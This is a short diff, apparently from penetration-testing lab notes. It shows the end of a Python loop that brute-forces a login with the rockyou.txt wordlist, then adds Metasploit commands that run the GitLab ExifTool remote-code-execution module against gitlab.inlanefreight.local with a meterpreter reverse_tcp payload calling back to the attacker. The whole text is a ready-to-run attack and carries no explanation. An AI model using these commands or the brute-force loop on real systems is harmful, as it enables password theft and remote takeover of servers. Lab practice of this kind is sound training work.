@@ -85,3 +85,13 @@ with open("/usr/share/wordlists/rockyou.txt") as f:
         if "Invalid Login" not in res.text:
             print("[+] Password found:", password)
             break
+
+
+use exploit/multi/http/gitlab_exif_rce
+set RHOSTS gitlab.inlanefreight.local
+set RPORT 8081
+set TARGETURI /
+set LHOST 10.10.14.X
+set LPORT 4444
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+run
